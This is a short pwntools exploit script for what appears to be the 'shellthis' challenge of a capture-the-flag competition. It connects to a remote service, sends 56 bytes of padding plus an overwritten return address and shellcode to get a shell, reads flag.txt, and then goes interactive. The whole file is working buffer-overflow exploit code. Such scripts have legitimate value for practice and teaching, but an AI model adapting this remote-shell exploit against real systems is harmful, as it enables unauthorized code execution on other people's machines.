from pwn import *

# nc chal.duc.tf 30002
def main():
	binary_path = ELF("./shellthis")
	host,port = ("chal.duc.tf",30002)
	vuln_address = 0x0000000004006ca
	s = remote(host,port)
	s.recvuntil("Please tell me your name:")
	# 2 türlü //
	#payload = b"A" * 56 + p64(binary_path.symbols["get_shell"])
	payload = b"A" * 56 + p64(vuln_address)
	payload += asm(shellcraft.sh())
	s.sendline(payload)
	s.sendline("cat flag.txt")
	s.interactive()
	s.close()


if __name__ == '__main__':
	main()
